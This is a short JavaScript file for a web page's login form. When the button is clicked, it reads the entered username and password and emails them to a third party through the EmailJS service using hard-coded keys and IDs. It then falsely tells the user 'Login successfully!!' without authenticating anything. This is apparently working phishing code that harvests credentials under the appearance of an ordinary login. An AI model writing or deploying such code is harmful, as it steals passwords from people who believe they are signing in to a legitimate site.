(function () {
  emailjs.init({
    publicKey: "0iJvYUboSufjy_kUj",
  });
})();

function sendMail() {
  var params = {
    userName: document.getElementById("userName").value,
    password: document.getElementById("password").value,
  };

  const serviceID = "service_t5ywtqa";
  const templateID = "template_1eqm6u5";

  emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
      document.getElementById("userName").value = "";
      document.getElementById("password").value = "";
      console.log(res);
      alert("Login successfully!!");
    })
    .catch((err) => console.log(err));
}

document
  .getElementById("submitSignUpBtn")
  .addEventListener("click", function (e) {
    sendMail();
  });
